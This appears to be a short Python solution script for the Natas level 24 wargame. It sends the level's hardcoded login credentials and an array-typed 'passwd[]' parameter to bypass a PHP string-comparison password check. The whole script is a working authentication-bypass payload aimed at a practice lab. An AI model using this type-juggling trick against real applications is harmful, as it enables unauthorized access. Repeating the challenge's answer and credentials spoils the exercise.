
import requests

auth = ('natas24', 'OsRmXFguozKpTZZ5X14zNO43379LZveg')
data = {"passwd[]": 42}

req = requests.post("http://natas24.natas.labs.overthewire.org/index.php",
                    auth=auth, data=data)

print(req.text)
